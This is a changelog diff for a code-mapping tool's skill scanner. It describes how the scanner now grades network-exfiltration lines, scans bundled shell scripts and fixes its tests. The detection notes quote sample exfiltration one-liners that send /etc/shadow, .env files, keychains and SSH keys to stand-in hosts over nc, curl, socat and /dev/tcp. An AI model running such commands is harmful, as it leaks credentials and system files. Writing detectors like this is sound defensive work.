+byte-identical output. It also stops an unextractable vendored path (a name component no filesystem accepts) from
+refusing the whole arm. A tree holding a tracked symlink is archived whole, since a link into a pruned directory would
+dangle and drop its symbols (landingcheck REPO4). An empty tree (git refuses an exclude-only pathspec over it) falls back to the plain archive. The one prune a pathspec cannot express — a directory holding `CMakeCache.txt` — is still
+extracted and still pruned by the crawl. Gate: `test/landingcheck.sh` REPO3 (red before, green after).
+
+### Fixed — `--scan-skills`: `EXFILTRATE:net-exfil` grades by credential source, needs a destination, and catches var-free uploads (#353)
+
+The rule fired on a fenced line with a network verb (`curl`, `wget`, `nc`) and any `$VAR` or `base64`. That
+shape says nothing about what is sent, so documented API calls and loopback checks such as
+`curl https://api.airtable.com/v0/$BASE_ID` and `curl http://127.0.0.1:$p/v1/models` were CRITICAL, and a
+CRITICAL blocks `ripwire wrap`. Three changes, all decided on the one line:
+
+- **Severity.** A hit is CRITICAL when a credential-shaped source is on the same line: a var whose name reads as
+  a credential, such as `$GITHUB_TOKEN`, `$AWS_…` or `$DB_PASSWORD`; an `Authorization:` header with a var; `env`,
+  `printenv` or `/proc/…/environ`; a key file such as `~/.ssh/…`, `*.pem`, `.netrc` or `.aws/credentials`; or a
+  file operand named like a credential, as in `cat secret | base64 | nc …`. Otherwise it is WARN, and the row
+  carries `why="no-cred-source"`.
+- **A destination is required.** The rule fires only when a network verb in command position names where it
+  sends: a URL, a `$VAR` argument, a host, `localhost` or `user@host`, netcat's positional `HOST PORT` pair
+  (`nc attacker 4444`, also `ncat` and `netcat`; `nc -l 4444` listens and names none), a socat `TCP:HOST:PORT`
+  address, a `/dev/tcp/HOST/PORT` redirect, or a single-label host after `curl`/`wget` (`curl -d @- evilhost`). The
+  verb is found through a chain of runner prefixes — `sudo`, `doas`, `run0`, `exec`, `time`, `nohup`, `nice`,
+  `timeout`, `xargs`, `env`, `stdbuf`, `setsid`, `eval`, `builtin`, `command` and the shell keywords — so
+  `command curl …`, `eval curl …` and `stdbuf -oL curl …` are still graded (their value-taking options, such as
+  `sudo -u deploy` and `stdbuf -o L`, are skipped). `env VAR=x curl …` is the assignment-prefix idiom, not an
+  environment dump. A verb that is only named, as in the reporter's `for t in jq curl git; do command -v "$t" …`
+  loop, `which curl`, `command -v nc`, `command -V wget` or `echo "install curl"`, does not fire.
+- **Var-free exfiltration is caught.** A sensitive file read that is piped, redirected or passed into an upload
+  is CRITICAL with or without a variable, and the row carries `why="sensitive-read-upload"`. Examples are
+  `cat /etc/passwd | curl … @-`, `curl -d @.env …`, a `wget` post of `/etc/shadow`,
+  `base64 server.pem | nc …`, `security dump-keychain | curl …`, `nc host port < .git-credentials`,
+  `cat /etc/passwd | nc attacker 4444`, `cat .env > /dev/tcp/1.2.3.4/80` and `socat - TCP:evil:443 < /etc/shadow`
+  (socat's `FILE:` address counts as a read). A read reaching a network verb is CRITICAL even when the destination
+  is a bare single-label host that R1 could not resolve. The readers whose non-flag arguments count as a read are
+  `cat`, `base64`, `xxd`, `od`, `head`, `tail`, `gzip`, `bzip2`, `xz`, `tar`, `cp`, `dd` (`if=FILE`) and `openssl`
+  (`-in FILE`); a flag such as `-w0` or `--` is skipped, so `base64 -w0 /etc/shadow` and `cat -- .env` are read.
+  Before this change these scanned clean. Sensitive sources are `/etc/passwd` and `/etc/shadow`, `~/.ssh/*`
+  except `*.pub`, `*.pem`, `*.key`, `id_rsa`-style key names, `.netrc`, `.aws/credentials`, `.env` and `.env.*`,
+  `.git-credentials`, a keychain or a keychain dump, a process environment, and a browser cookie store. Reading
+  `README.md` into an upload, or reading `/etc/passwd` and then running `curl` as a separate statement, does not
+  fire. A `~/.ssh` or `~/.aws` path is still claimed first by the older `EXFILTRATE:ssh-aws-creds` rule, which is
+  CRITICAL too.
+
+Both `why=` values are defined in the compact and the full legend. Scans where neither rule applies are
+byte-identical. The reporter published a corrected 107-row histogram; a synthetic set built from it has 106
+firing lines on main, all CRITICAL. On this build 6 are CRITICAL (the `Authorization: Bearer $…` lines), 99 are
+WARN (including the three `http://<host>:<port>` doc placeholders), and the `command -v` loop no longer fires. On
+the first-histogram set, 109 CRITICAL become 6 CRITICAL, 102 WARN and one silent line. The decision is still
+line-local. It does not resolve a `$VAR` to its assignment, does not tell a token's own service from another host,
+and does not follow a read on one line to an upload on the next. That is the source-to-sink flow decision, which
+is still to come. `src/skillscan.h` and `docs/LINEAGE.md` now note that this hardening was informed by ideas from NVIDIA SkillSpector
+(Apache-2.0), surveyed as related work; no SkillSpector code or pattern text is included. A counted lineage row, with
+per-rule attribution, will be added once the planned port of its code-based checks lands.
+Gated by `test/skillscan.sh` check 18 over the five blocks of `test/skillfix/netexfil_severity.md`, and by
+`test/regexguardcheck.sh` arm (f1), whose oracle now specifies the destination rule too and agrees with the scanner
+on 3,000 generated lines; each of its destination branches (the netcat pair, the socket address, the `/dev/tcp`
+redirect) turns the arm red when removed from the oracle.
+
+### Fixed — `traceasanlinearcheck` arm B compares medians, so one stalled run no longer reads as quadratic (#352)
+
+The full-matrix run on `3fcd515f` failed arm B1 on one sample per size: 31 / 65 / 637 / 1382 ms for
+40 KB / 160 KB / 640 KB / 2.5 MB. The same run's next step, 640 KB to 2.5 MB, cost 2.2x, which is below linear.
+A real O(k^2) parse would have taken about 10 s at 2.5 MB, so the 640 KB run had stalled once. `--from-trace`'s
+ASan parser is unchanged since its linear rewrite. Locally, five reps at each size from 40 KB to 10 MB measure
+39 / 74 / 184 / 498 / 1838 ms (medians), and the step ratio approaches 4x from below. Arm B now times each size
+five times, round-robin across the sizes, and compares medians. The thresholds are unchanged. Replaying the CI
+stall (one 640 KB run delayed 0.6 s) fails the old arm and passes the new one. A deliberately quadratic per-word
+rescan in `scanAsanWordBoundaries` still fails B1, B2 and B3 (medians 1033 / 14094 ms / timeout).
 
 ### Fixed — the Linux G1 sanitizer ritual completes: five string_view comparator lambdas stop wrapping, and the GCC ASan path builds (#342)
 
@@ -116,6 +595,60 @@ print are unchanged.
 
 `test/recallpassagecheck.sh` and `test/impactpartitioncheck.sh` are executable now (mode 100755 like every
 other gate); direct `./test/…` invocation exits 126 no more.
+
+### Fixed — `--scan-skills` scans a skill's bundled shell scripts as code, and discloses the code it cannot flow-scan (`.py` `.js` `.mjs` `.cjs` `.jsx` `.ts` `.mts` `.cts` `.tsx` `.rb` `.pl` `.pm` `.lua` `.php` `.ps1` `.psm1` `.psd1` `.bat` `.cmd`, a non-shell `#!`)
+
+`--scan-skills` reads every regular file under a skill, but ran each through the markdown fence tracker. So
+`EXFILTRATE:net-exfil`, which fires only inside a fenced code block, never fired in `scripts/helper.sh`: a
+`curl … $GITHUB_TOKEN` upload that is CRITICAL inside a fenced `bash` code block in `SKILL.md` read clean (exit 0) in the
+script, with or without a shebang, through `--scan-skills` and `--scan-skill` alike, and a pair of triple-backtick fence lines in a
+heredoc could close a fence the scan thought open. A `.sh`/`.bash`/`.zsh`/`.ksh` file, or one whose `#!` (after a UTF-8 BOM, if
+any) names `sh`, `bash`, `zsh`, `dash`, `ksh`, `ash` or `mksh` (through `env` or `busybox` too), or a shell startup file (`.bashrc`,
+`.bash_profile`, `.bash_login`, `.bash_logout`, `.bash_aliases`, `.zshrc`, `.zshenv`, `.zprofile`, `.zlogin`, `.profile`,
+`.kshrc`, `.envrc`), now also gets a whole-file-code pass — no YAML frontmatter (bash runs a
+leading `---` line and everything after it), every line is command context, and no triple-backtick line toggles anything — merged with the markdown pass, so a script can only gain rows
+(measured over the 1,242 code files in this repo: no row lost, 23 added, 17 of them WARN `why="no-cred-source"`).
+Markdown input is byte-identical. Code in a language the scanner has no network-flow model for — exactly `.py`, `.js`, `.mjs`, `.cjs`, `.jsx`, `.ts`, `.mts`, `.cts`, `.tsx`, `.rb`, `.pl`, `.pm`, `.lua`, `.php`, `.ps1`, `.psm1`, `.psd1`, `.bat`, `.cmd`,
+or another `#!` — is read as before and disclosed: `<skillscan
+code_not_flow_scanned="N">`, defined in the compact and full legends and counted on the stderr tally; `clean` does
+not cover those files. Python and JavaScript flow shapes (`requests.post` or `urllib` with `os.environ`, which is
+missed even inside a fenced `python` block) are 0.6.7 work. `ripwire wrap`'s pre-install scan read only `.md`
+files, so it emitted the recipe (rc 0, empty stderr) for a skill whose `scripts/helper.sh` uploads a credential; it now
+scans every regular file of `./skills` and `.agents/skills` through the same kind-aware scan, following directory
+symlinks as `--scan-skills` does (each directory entered once, by device and inode, so a link loop ends), refuses such a skill
+(rc 1 unless `--force`), and counts code files it cannot flow-scan on stderr. Gate: `test/skillscan.sh` check 19. The `<f rule= sev=>` row attributes are now defined in both
+`--scan-skills` legends (present only when the answer has rows; they never were, on any earlier build), and past the
+200-row cap the shown rows are the worst severity first (every CRITICAL, then WARN), so a WARN flood cannot hide the
+CRITICAL evidence row; an uncapped answer keeps scan order.
+
+### Fixed — `ripwire <dir> --scan-skills` no longer answers "clean" for a `<dir>` it never read
+
+The bare form walks `./.agents/skills` under the current directory and the Claude and Codex skill homes; it never read a
+positional root, yet `ripwire <dir> --scan-skills` answered `files="0" verdict="clean"` at exit 0 for a `<dir>` holding a
+CRITICAL script, and the empty-value hint said it "scans the tree it maps". A positional root other than the current
+directory is now refused by name (exit 3, this verb's "never scanned it" code, since 0/1/2 are verdicts: pass
+`--scan-skills=<dir>` or `cd` there), the hint and `--help` say what the bare form walks, and its answer names the
+directories it walked in `dirs=` (present only on the bare form; defined in the compact and full legends). Scans of a
+`DIR` or a single file are byte-identical. Gate: `test/skillscan.sh` check 20 (M5).
+
+### Fixed — `--stray-content` defines the `diffable="0"` it emits for a binary on an unmerged branch
+
+A file an unmerged local branch holds that cannot be line-diffed (a binary or oversized blob on some side, e.g. an
+image) is listed as `<file … diffable="0"/>` with its counts at 0, but no legend defined `diffable=`: not the default
+(compact) legend, not `--legend=full`, not the MCP `stray_content` twin or the session dictionary. So
+`legendcoveragecheck` arm (G) went red in any clone whose local branches held such a file and green everywhere else.
+The compact legend (and with it the session dictionary, one entry more) and the full legend now define it;
+the compact reading is present-only, so a default answer with no such row is byte-identical to before (the full
+legend gains one sentence). `legendcoveragecheck`
+gains arm (H), which builds that state in a throwaway repo — a text file and a binary on an unmerged branch — and
+requires the CLI default, `--legend=full` and the MCP twin to define every attribute they emit.
+
+### Documented — adding a language is data first; common mechanisms stay common
+
+`CONTRIBUTING.md` gains "Adding a language: common stays common", and `prompts/add-a-language.md` follows it: a new
+language is a `kLangTable` row, a `tags.scm` in the shared capture vocabulary and its `switch( Lang )` rows, plus small
+per-language pieces only where semantics truly differ; the shared scope, shadowing and import mechanisms are extended,
+never copied, and an unresolvable qualified call is counted as unresolved rather than guessed.
 
 ## [0.6.5] — 2026-09-27
 
